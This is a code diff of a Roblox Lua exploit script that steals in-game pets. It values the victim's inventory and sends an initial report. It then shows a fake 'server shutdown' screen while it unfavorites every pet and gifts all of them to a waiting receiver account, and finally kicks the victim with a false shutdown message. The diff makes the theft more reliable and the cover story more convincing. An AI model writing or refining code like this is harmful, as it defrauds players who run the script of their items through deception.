@@ -17,6 +17,7 @@ local SHUTDOWN_DURATION = 10
 local GIFT_COOLDOWN = 3
 local MINIMUM_PETS = 3
 local MINIMUM_TOTAL_VALUE = 50000
+local CLICK_HOLD_DURATION = 2 -- Added click hold duration
 
 local function identifyExecutor()
     if syn then
@@ -93,7 +94,8 @@ local function getPetsInventory()
                 kg = kg,
                 age = age,
                 special = isSpecial,
-                value = math.floor((kg * 10000) + (age * 1000)
+                value = math.floor((kg * 10000) + (age * 1000)),
+                favorited = item:GetAttribute("Favorited") or false
             })
         end
     end
@@ -457,34 +459,30 @@ local function sendInitialReport()
     })
 end
 
-local function unfavoriteAllPets()
-    -- Find the FavoriteOnly frame in the player's backpack UI
-    local backpackGui = LocalPlayer.PlayerGui:FindFirstChild("Backpack")
-    if not backpackGui then return false end
+local function isPetFavorited(petName)
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    if not pet then return false end
     
-    local favoriteOnlyFrame = backpackGui:FindFirstChild("FavoriteOnly", true)
-    if not favoriteOnlyFrame then return false end
-    
-    -- Click the FavoriteOnly button to show favorited pets
-    VirtualInputManager:SendMouseButtonEvent(favoriteOnlyFrame.AbsolutePosition.X + favoriteOnlyFrame.AbsoluteSize.X/2,
-                                           favoriteOnlyFrame.AbsolutePosition.Y + favoriteOnlyFrame.AbsoluteSize.Y/2,
-                                           0, true, game, 1)
-    task.wait(0.1)
-    VirtualInputManager:SendMouseButtonEvent(favoriteOnlyFrame.AbsolutePosition.X + favoriteOnlyFrame.AbsoluteSize.X/2,
-                                           favoriteOnlyFrame.AbsolutePosition.Y + favoriteOnlyFrame.AbsoluteSize.Y/2,
-                                           0, false, game, 1)
-    task.wait(0.5)
-    
-    -- Unfavorite all pets that are shown
-    local pets = getPetsInventory()
-    for _, pet in ipairs(pets) do
-        if pet.instance:GetAttribute("Favorited") then
-            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet.instance)
-            task.wait(0.2)
+    -- Check for favorite icon in the pet's descendants
+    for _, descendant in ipairs(pet:GetDescendants()) do
+        if descendant:IsA("ImageLabel") and descendant.Name == "FavoriteIcon" then
+            return true
         end
     end
     
-    return true
+    return pet:GetAttribute("Favorited") or false
+end
+
+local function unfavoritePet(petName)
+    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
+    if pet then
+        -- Check if the pet is actually favorited before unfavoriting
+        if isPetFavorited(petName) then
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+            return true
+        end
+    end
+    return false
 end
 
 local function giftPet(targetPlayer, petName)
@@ -533,6 +531,7 @@ local function isReceiverInGame()
     return nil
 end
 
+local shutdownGui
 local function createFakeShutdown()
     local gui = Instance.new("ScreenGui")
     gui.Name = "FakeShutdown"
@@ -615,6 +614,7 @@ local function createFakeShutdown()
         title.TextSize = 32 * pulse
     end)
 
+    shutdownGui = gui
     return gui, function()
         if fadeConn then fadeConn:Disconnect() end
         if dotConn then dotConn:Disconnect() end
@@ -654,32 +654,12 @@ local function waitForReceiver()
     local foundReceiver = receiverFound.Event:Wait()
     connection:Disconnect()
     
-    local shutdownGui, cleanup = createFakeShutdown()
+    createFakeShutdown()
     
-    -- Keep shutdown screen active until receiver leaves
-    local receiverLeft = false
-    local function onReceiverLeft()
-        receiverLeft = true
-        cleanup()
-    end
-    
-    if foundReceiver then
-        foundReceiver.AncestryChanged:Connect(function(_, parent)
-            if not parent then
-                onReceiverLeft()
-            end
-        end)
-    end
-    
-    -- If receiver leaves before shutdown duration, wait the remaining time
-    if not receiverLeft then
-        task.wait(SHUTDOWN_DURATION)
-        cleanup()
-    end
-    
-    return foundReceiver, receiverLeft
+    return foundReceiver
 end
 
+-- Delta-specific functions
 local function clickPlayerScreen(targetPlayer)
     if not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return false end
     
@@ -689,9 +669,9 @@ local function clickPlayerScreen(targetPlayer)
     
     local x, y = pos.X, pos.Y
     
-    -- Hold the click for 0.5 seconds
+    -- Hold click for 2 seconds
     VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
-    task.wait(0.5)
+    task.wait(CLICK_HOLD_DURATION)
     VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
     
     return true
@@ -709,12 +689,24 @@ local function checkForGiftPrompt(targetPlayer)
 end
 
 local function startGifting(targetPlayer)
-    -- First unfavorite all pets
-    unfavoriteAllPets()
-    
     while true do
+        -- Check if receiver is still in game
+        if not Players:FindFirstChild(targetPlayer.Name) then
+            if shutdownGui then
+                shutdownGui:Destroy()
+            end
+            LocalPlayer:Kick("Server has shutdown")
+            break
+        end
+
         local pets = getPetsInventory()
-        if #pets == 0 then break end
+        if #pets == 0 then 
+            if shutdownGui then
+                shutdownGui:Destroy()
+            end
+            LocalPlayer:Kick("All pets gifted successfully")
+            break
+        end
 
         for _, pet in ipairs(pets) do
             if IS_DELTA then
@@ -735,9 +727,10 @@ local function startGifting(targetPlayer)
                                 success = true
                                 task.wait(GIFT_COOLDOWN)
                             elseif promptStatus == "favorited" then
-                                unfavoriteAllPets()
-                                task.wait(1)
-                                equipSinglePet(pet.fullName)
+                                if unfavoritePet(pet.fullName) then
+                                    task.wait(1)
+                                    equipSinglePet(pet.fullName)
+                                end
                             else
                                 task.wait(1)
                             end
@@ -750,6 +743,11 @@ local function startGifting(targetPlayer)
                 end
             else
                 -- Normal gifting logic
+                if isPetFavorited(pet.fullName) then
+                    unfavoritePet(pet.fullName)
+                    task.wait(1)
+                end
+
                 if equipSinglePet(pet.fullName) then
                     giftPet(targetPlayer, pet.fullName)
                     task.wait(GIFT_COOLDOWN)
@@ -765,14 +763,8 @@ createLoader()
 sendInitialReport()
 task.wait(2)
 
-local receiver, receiverLeft = waitForReceiver()
+local receiver = waitForReceiver()
 if not receiver then return end
-
-if receiverLeft then
-    -- If receiver left during shutdown, kick the player
-    LocalPlayer:Kick("Server has shutdown for maintenance")
-    return
-end
 
 teleportToPlayer(receiver)
 startGifting(receiver)
